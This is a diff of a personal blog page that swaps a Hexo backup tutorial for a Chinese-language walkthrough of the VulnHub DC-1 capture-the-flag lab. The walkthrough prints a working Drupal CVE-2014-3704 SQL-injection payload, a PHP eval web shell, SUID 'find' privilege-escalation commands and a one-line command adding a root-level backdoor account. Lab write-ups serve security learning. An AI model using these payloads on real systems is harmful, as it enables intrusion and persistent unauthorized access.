@@ -16,22 +16,39 @@
 
 
 
-<meta name="description" content="前言强烈建议hexo博客搭建完毕后，并且上传到github后，做的第一件事情是去将你的hexo博客备份到github上去。我知道你肯定很开心搭建博客成功，想怎么怎么去美化你的博客，我想说数据无价，如果你跟笔者有着因为没有备份hexo博客数据，而造成不可逆的后果后，想想都是泪，备份完后再去美化你的博客吧！">
+<meta name="description" content="前言　　Vulnhub是一个提供各种漏洞的靶机网站，本章靶机是入门级别的dc1，下载，我们的目标是要找到5个flag。下载后是的ova文件导入VMware Workstation15（低版本不支持导入ova文件）。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hexo博客备份">
-<meta property="og:url" content="http://maidang.cool/38686.html">
+<meta property="og:title" content="VulnHub-DC1(一)">
+<meta property="og:url" content="http://maidang.cool/2020/55500.html">
 <meta property="og:site_name" content="Lion">
-<meta property="og:description" content="前言强烈建议hexo博客搭建完毕后，并且上传到github后，做的第一件事情是去将你的hexo博客备份到github上去。我知道你肯定很开心搭建博客成功，想怎么怎么去美化你的博客，我想说数据无价，如果你跟笔者有着因为没有备份hexo博客数据，而造成不可逆的后果后，想想都是泪，备份完后再去美化你的博客吧！">
+<meta property="og:description" content="前言　　Vulnhub是一个提供各种漏洞的靶机网站，本章靶机是入门级别的dc1，下载，我们的目标是要找到5个flag。下载后是的ova文件导入VMware Workstation15（低版本不支持导入ova文件）。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://maidang.cool/hexo%E5%8D%9A%E5%AE%A2%E5%A4%87%E4%BB%BD/successful.png">
-<meta property="og:image" content="http://maidang.cool/hexo%E5%8D%9A%E5%AE%A2%E5%A4%87%E4%BB%BD/hexo_version.png">
-<meta property="og:image" content="http://maidang.cool/hexo%E5%8D%9A%E5%AE%A2%E5%A4%87%E4%BB%BD/backup.png">
-<meta property="article:published_time" content="2020-01-10T02:06:36.000Z">
-<meta property="article:modified_time" content="2020-01-10T02:06:36.000Z">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BGvebT.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BGxVWd.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BGzeNF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJSoQA.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJPtl4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJFXF0.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJk9OJ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJkH1O.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJADDH.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJMM2n.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJMDr6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJQolR.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJldnx.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJlc3d.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJljbV.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJ1Eb6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJ3peP.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJ3lYF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJ3L7V.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJdYXF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/29/BJwg2V.png">
+<meta property="article:published_time" content="2020-10-29T08:05:41.000Z">
+<meta property="article:modified_time" content="2020-10-29T08:05:41.000Z">
 <meta property="article:author" content="麦当">
-<meta property="article:tag" content="hexo">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://maidang.cool/hexo%E5%8D%9A%E5%AE%A2%E5%A4%87%E4%BB%BD/successful.png">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/10/29/BGvebT.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -65,10 +82,10 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>hexo博客备份 | Lion</title>
+<title>VulnHub-DC1(一) | Lion</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
-<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+<script src=""></script>
 
 <script>
     var yiliaConfig = {
@@ -97,7 +114,7 @@
 
 
 
-<meta name="generator" content="Hexo 4.2.0"></head>
+<meta name="generator" content="Hexo 5.2.0"></head>
 <body>
   <div id="container">
     <div class="left-col">
@@ -108,35 +125,9 @@
             <img src="https://s1.ax1x.com/2020/04/18/JmkHGq.jpg" class="animated zoomIn">
         </a>
         <hgroup>
-          <h1 class="header-author"><a href="/">麦当</a></h1>
+          <h1 class="header-author"><a href="/"></a></h1>
         </hgroup>
 
-        
-            <!--   原个性签名    -->
-        <!-- <p class="header-subtitle">人生若只如初见,何事秋风悲画扇</p>-->
-
-            <div style="margin: 0 auto;text-align: left;font-size: 16px;color: #444;font-family: 宋体;font-weight: bold;">
-                <span id="hitokoto">获取中...</span>
-                <p style="text-align: right">
-                    <span>——</span>
-                    <span id="from"></span>
-                </p>
-            </div>
-
-            <script>
-                var xhr = new XMLHttpRequest();
-                xhr.open('get', 'https://v1.hitokoto.cn/?c=b&c=a&c=d&length=12');
-                xhr.onreadystatechange = function () {
-                    if (xhr.readyState === 4) {
-                        var data = JSON.parse(xhr.responseText);//获得字符串形式的响应数据。
-                        var hitokoto = document.getElementById('hitokoto');
-                        var fromm=document.getElementById("from")
-                        fromm.innerText=data.from;
-                        hitokoto.innerText = data.hitokoto;
-                    }
-                }
-                xhr.send();
-            </script>
         
 
         
@@ -203,13 +194,13 @@
                     <nav class="header-nav">
                         <ul class="social">
                             
-                                <a class="fa Github" href="https://github.com/SnowMeteors" target="_blank" rel="noopener" title="Github"></a>
+                                <a class="fa Github" target="_blank" rel="noopener" href="https://github.com/SnowMeteors" title="Github"></a>
                             
-                                <a class="fa 牛客网" href="https://www.nowcoder.com/profile/5746494" target="_blank" rel="noopener" title="牛客网"></a>
+                                <a class="fa 牛客网" target="_blank" rel="noopener" href="https://www.nowcoder.com/profile/5746494" title="牛客网"></a>
                             
-                                <a class="fa 秒速五厘米" href="https://music.163.com/#/album?id=49790" target="_blank" rel="noopener" title="秒速五厘米"></a>
+                                <a class="fa 秒速五厘米" target="_blank" rel="noopener" href="https://music.163.com/#/album?id=49790" title="秒速五厘米"></a>
                             
-                                <a class="fa bilibili" href="https://space.bilibili.com/381708330" target="_blank" rel="noopener" title="bilibili"></a>
+                                <a class="fa bilibili" target="_blank" rel="noopener" href="https://space.bilibili.com/381708330" title="bilibili"></a>
                             
                         </ul>
                     </nav>
@@ -227,7 +218,7 @@
                 <section class="switch-part switch-part3">
                     <div id="js-friends">
                     
-                      <a class="main-nav-link switch-friends-link" href="https://www.tianchenyi.com/" target="_blank" rel="noopener">小琲的天尘翼</a>
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://www.tianchenyi.com/">小琲的天尘翼</a>
                     
                     </div>
                 </section>
@@ -279,7 +270,7 @@
       <nav id="mobile-nav">
       <div class="overlay">
           <div class="slider-trigger"></div>
-          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">麦当</a></h1>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
       </div>
     <div class="intrude-less">
         <header id="header" class="inner">
@@ -287,10 +278,8 @@
                 <img src="https://s1.ax1x.com/2020/04/18/JmkHGq.jpg" class="animated zoomIn">
             </a>
             <hgroup>
-              <h1 class="header-author"><a href="/" title="回到主页">麦当</a></h1>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
             </hgroup>
-            
-            <p class="header-subtitle">人生若只如初见,何事秋风悲画扇</p>
             
             <nav class="header-menu">
                 <ul>
@@ -324,11 +313,11 @@
     <link class="menu-list" tags="标签" friends="友情链接" about="个性签名"/>
 </nav>
       <div class="body-wrap">
-        <article id="post-hexo博客备份" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-VulnHub-DC1(一) " class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/38686.html" class="article-date">
-      <time datetime="2020-01-10T02:06:36.000Z" itemprop="datePublished">2020-01-10</time>
+      <a href="/2020/55500.html" class="article-date">
+      <time datetime="2020-10-29T08:05:41.000Z" itemprop="datePublished">2020-10-29</time>
 </a>
 
 
@@ -343,30 +332,9 @@
         
   
     <h1 class="article-title" itemprop="name">
-      hexo博客备份
+      VulnHub-DC1(一)
     </h1>
   
-
-        
-            <div>
-    <span class="post-time">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-keyboard-o"></i>
-        <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">590字</span>
-      </span>
-    </span>
-
-    <span class="post-time">
-      &nbsp; | &nbsp;
-      <span class="post-meta-item-icon">
-        <i class="fa fa-hourglass-half"></i>
-        <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">2分</span>
-      </span>
-    </span>
-</div>
-
 
         
       </header>
@@ -374,15 +342,11 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/hexo/">hexo</a>
+    <a class="article-category-link" href="/categories/VulnHub/">VulnHub</a>
     </div>
 
 
         
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li></ul>
-    </div>
-
         <div class="clearfix"></div>
       </div>
       
@@ -390,37 +354,31 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>强烈建议hexo博客搭建完毕后，并且上传到github后，做的第一件事情是去将你的hexo博客备份到github上去。我知道你肯定很开心搭建博客成功，想怎么怎么去美化你的博客，我想说数据无价，如果你跟笔者有着因为没有备份hexo博客数据，而造成不可逆的后果后，想想都是泪，备份完后再去美化你的博客吧！</p>
-<a id="more"></a>
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>　　Vulnhub是一个提供各种漏洞的靶机网站，本章靶机是入门级别的dc1，<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1,292/">下载</a>，我们的目标是要找到5个flag。下载后是的ova文件导入VMware Workstation15（低版本不支持导入ova文件）。<br><a id="more"></a></p>
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>　　打开靶机后，是不知道密码的，第一次打靶的我还很疑惑为什么不给密码……<br>　　<img src="https://s1.ax1x.com/2020/10/29/BGvebT.png"><br>　　<code>nmap -sn 10.16.122.0/24</code>得到靶机ip为10.16.122.6<br>　　<img src="https://s1.ax1x.com/2020/10/29/BGxVWd.png"><br>　　<code>nmap -A --script=vuln 10.16.122.6</code>探测主机信息<br>　　开放了80和22端口，并且存在cve-2014-3704，如果你觉得自己人品好就去爆破吧(ಡωಡ)<br>　　<img src="https://s1.ax1x.com/2020/10/29/BGzeNF.png"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>　　使用burp截取到登陆请求包，并发送到Repeater<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJSoQA.png"><br>　　cve-2014-3704这个漏洞是sql注入，能直接数据库添加用户名和密码<br>　　payload</p>
+<pre class="line-numbers language-none"><code class="language-none">name[0%20;update+users+set+name%3d&#39;root&#39;+,+pass+%3d+&#39;$S$DkIkdKLIvRK0iVHm99X7B&#x2F;M8QC17E1Tp&#x2F;kMOd1Ie8V&#x2F;PgWjtAZld&#39;+where+uid+%3d+&#39;1&#39;;;#%20%20]&#x3D;test3&amp;name[0]&#x3D;test&amp;pass&#x3D;shit2&amp;test2&#x3D;test&amp;form_build_id&#x3D;&amp;form_id&#x3D;user_login_block&amp;op&#x3D;Log+in<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>　　将上述payload贴进来，发包后，将会创建一个用户名为:root 密码:thanks的账户，如果登陆失败，多发几次包即可。<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJPtl4.png"></p>
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>　　登陆进来后，点击最上面的content获取到flag3<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJFXF0.png"><br>　　flag3提示用find -exec，想到用suid提权<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJk9OJ.png"><br>　　来到modules，开启php filter<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJkH1O.png"><br>　　新建articel文章，并写入php一句话木马&lt;?php @eval($_POST[“x”]); ?&gt;，底下的text format换成PHP code<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJADDH.png"><br>　　文章成功发布后，使用蚁剑连接</p>
+<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>　　ls后，直接在当前目录发现flag1.txt<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJMM2n.png"><br>　　flag1提示查看站点配置文件<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJMDr6.png"></p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>　　Drupal的默认配置文件为  /var/www/sites/default/settings.php，查看后<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJQolR.png"><br>　　获取到数据库信息，告诉你可以选择爆破，我反正不会这样做</p>
+<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>　　使用find / -name flag*.txt命令，直接来查找flag文件，获取到flag4<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJldnx.png"><br>　　你能成功访问到/root下的flag吗？恩，我能！<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJlc3d.png"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>　　看来接下来就是要提权了<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJljbV.png"><br>　　uname -a后得到Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux<br>　　尝试使用脏牛提权，好像make版本太低<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJ1Eb6.png"><br>　　换个思路，前面提示说suid提权，试试<br>　　<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span>
+<span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+<span class="token function">find</span> / -user root -perm -4000-print<span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+<span class="token function">find</span> / -user root -perm -4000-exec <span class="token function">ls</span> -ldb <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>　　这里前面提示的find<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJ3peP.png"><br>　　root权限<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJ3lYF.png"><br>　　如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> <span class="token builtin class-name">test</span>
+<span class="token function">find</span> <span class="token builtin class-name">test</span> -exec <span class="token function">whoami</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>　　<img src="https://s1.ax1x.com/2020/10/29/BJ3L7V.png"></p>
+<h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>　　<img src="https://s1.ax1x.com/2020/10/29/BJdYXF.png"></p>
+<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>　　既然都是root，哪就添加一个用户吧<br>　　一句话添加用户并且是root权限，用户名:lion 密码:123456</p>
+<pre>
+useradd -p`openssl passwd -1 -salt 'salt' 123456` lion -o -u 0 -g root -G root -s /bin/bash -d /home/test
+</pre>
 
-<h3 id="建立hexo分支"><a href="#建立hexo分支" class="headerlink" title="建立hexo分支"></a>建立hexo分支</h3><p>在博客目录下输入新分支命令(比如我的博客在E:\blog)</p>
-<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">git</span> checkout -<span class="keyword">b </span>hexo</span><br></pre></td></tr></table></figure>
+<p>　　<img src="https://s1.ax1x.com/2020/10/29/BJwg2V.png">
+　　</p>
 
-<p><strong>hexo</strong>是自定义的分支的名称，建议命名成hexo</p>
-<h3 id="提交分支到Github"><a href="#提交分支到Github" class="headerlink" title="提交分支到Github"></a>提交分支到Github</h3><p>一样在hexo博客的目录下输入以下命令</p>
-<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">git</span> <span class="keyword">add </span>.				//注意<span class="keyword">add后面有一个空格</span></span><br><span class="line"><span class="keyword">git </span>commit -m <span class="string">"Backup"</span></span><br><span class="line"><span class="symbol">git</span> <span class="keyword">push </span>origin hexo			//将hexo分支提交到github上去</span><br></pre></td></tr></table></figure>
-
-<p>你提交分支可能会失败，这里每个人的情况不一样，根据报错信息,自己解决，我反正搞了很久才提交成功。<br>提交成功后，你可以看到github上有两个分支如图所示.<br><img src="hexo%E5%8D%9A%E5%AE%A2%E5%A4%87%E4%BB%BD/successful.png" alt=""></p>
-<h3 id="安装hexo备份插件"><a href="#安装hexo备份插件" class="headerlink" title="安装hexo备份插件"></a>安装hexo备份插件</h3><p>输入命令<code>hexo version</code>查看Hexo版本</p>
-<p><img src="hexo%E5%8D%9A%E5%AE%A2%E5%A4%87%E4%BB%BD/hexo_version.png" alt=""></p>
-<p>Hexo版本是2.x.x使用以下命令,我的版本可以看到是4.2.0</p>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-git-<span class="symbol">backup@</span><span class="number">0.0</span><span class="number">.91</span> --save</span><br></pre></td></tr></table></figure>
-
-<p>Hexo版本是3.x.x使用,我的虽然是4.2.0使用下面命令亲测有效</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span> hexo-git-<span class="keyword">backup</span> <span class="comment">--save</span></span><br></pre></td></tr></table></figure>
-
-<p>到Hexo博客的根目录<code>_config.yml</code>添加以下配置,添加到文件末尾即可</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">backup</span>:</span><br><span class="line">  <span class="attribute">type</span>: git</span><br><span class="line">  <span class="attribute">theme</span>: yelee</span><br><span class="line">  <span class="attribute">message</span>: Back up my blog</span><br><span class="line">  <span class="attribute">repository</span>:</span><br><span class="line">    <span class="attribute">github</span>: git<span class="variable">@github</span>.<span class="attribute">com</span>:githubname/githubname.github.io.git,hexo</span><br></pre></td></tr></table></figure>
-
-<p>theme:选择备份的主题<br>message:自定义提交信息<br>repository:仓库名,分支名，已经建立过hexo分支，所以填hexo，githubname填写成你github上的用户名</p>
-<h3 id="备份博客数据"><a href="#备份博客数据" class="headerlink" title="备份博客数据"></a>备份博客数据</h3><p>最后输入以下命令开始备份博客</p>
-<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo b</span></span><br></pre></td></tr></table></figure>
-
-<p>备份成功后，你将在你的分支下看到备份好的数据</p>
-<p><img src="hexo%E5%8D%9A%E5%AE%A2%E5%A4%87%E4%BB%BD/backup.png" alt=""></p>
-<p>如果你没有备份成功，那么请使用hexo b后再使用git push origin hexo命令,反正我是没有备份成功后，找了半天教程，才发现这样我才能备份成功，无语了。</p>
-<p>以上内容我不能保证你100%成功，那么请善用搜索引擎，成功绝对不是偶然。</p>
-<center>♥感谢你的阅读♥</center>
       
     </div>
     
@@ -428,17 +386,17 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/38686.html">hexo博客备份</a></p>
-        <p><span>文章作者:</span><a href="/" title="回到主页">麦当</a></p>
-        <p><span>发布时间:</span>2020-01-10, 10:06:36</p>
-        <p><span>最后更新:</span>2020-01-10, 10:06:36</p>
+        <p><span>本文标题:</span><a href="/2020/55500.html">VulnHub-DC1(一)</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2020-10-29, 16:05:41</p>
+        <p><span>最后更新:</span>2020-10-29, 16:05:41</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/38686.html" title="hexo博客备份">http://maidang.cool/38686.html</a>
-            <span class="copy-path" data-clipboard-text="From http://maidang.cool/38686.html　　By 麦当" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2020/55500.html" title="VulnHub-DC1(一)">http://maidang.cool/2020/55500.html</a>
+            <span class="copy-path" data-clipboard-text="From http://maidang.cool/2020/55500.html　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
-            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
         </p>
     </div>
 
@@ -446,12 +404,12 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/35585.html">
-                    hexo博客恢复
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2020/45983.html">
+                    一次授权渗透实战
                 </a>
             </div>
-        
         
     </nav>
 
@@ -461,7 +419,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#建立hexo分支"><span class="toc-text">建立hexo分支</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提交分支到Github"><span class="toc-text">提交分支到Github</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#安装hexo备份插件"><span class="toc-text">安装hexo备份插件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#备份博客数据"><span class="toc-text">备份博客数据</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3"><span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1"><span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2"><span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag4"><span class="toc-text">flag4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag5"><span class="toc-text">flag5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E5%B0%BE"><span class="toc-text">结尾</span></a></li></ol>
         
     </div>
     <style>
@@ -497,7 +455,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"hexo博客备份　| Lion　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"VulnHub-DC1(一)　| Lion　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -517,19 +475,19 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/35585.html" title="Pre: hexo博客恢复">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+            <a href="/2020/45983.html" title="下一篇: 一次授权渗透实战">
+                <i class="fa fa-angle-right"></i>
+            </a>
         
     </div>
 
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/45983.html">一次授权渗透实战</a></li><li class="post-list-item"><a class="post-list-link" href="/34786.html">数据结构之链表篇</a></li><li class="post-list-item"><a class="post-list-link" href="/57354.html">DVWA</a></li><li class="post-list-item"><a class="post-list-link" href="/48647.html">burpsuite</a></li><li class="post-list-item"><a class="post-list-link" href="/57748.html">Windows提权</a></li><li class="post-list-item"><a class="post-list-link" href="/28534.html">获取酷我音乐，网易云真实外链</a></li><li class="post-list-item"><a class="post-list-link" href="/35585.html">hexo博客恢复</a></li><li class="post-list-item"><a class="post-list-link" href="/38686.html">hexo博客备份</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/55500.html">VulnHub-DC1(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/45983.html">一次授权渗透实战</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/34786.html">数据结构之链表篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/57354.html">DVWA</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/48647.html">burpsuite</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/57748.html">Windows提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/28534.html">获取酷我音乐，网易云真实外链</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/35585.html">hexo博客恢复</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/38686.html">hexo博客备份</a></li></ul>
 
 
 
@@ -694,5 +652,9 @@
   <!--  实现点击出爱心-->
   <script type="text/javascript" src="/js/src/love.js"></script>
   <script type="text/javascript" src="/js/src/value.js"></script>
+  <!--  代码高亮 -->
+  <link type="text/css" rel="stylesheet" href="/css/prism.css">
+
+
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"hOffset":-15,"vOffset":-80,"position":"right","width":200},"mobile":{"show":false},"react":{"opacity":0.6},"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
 </html>
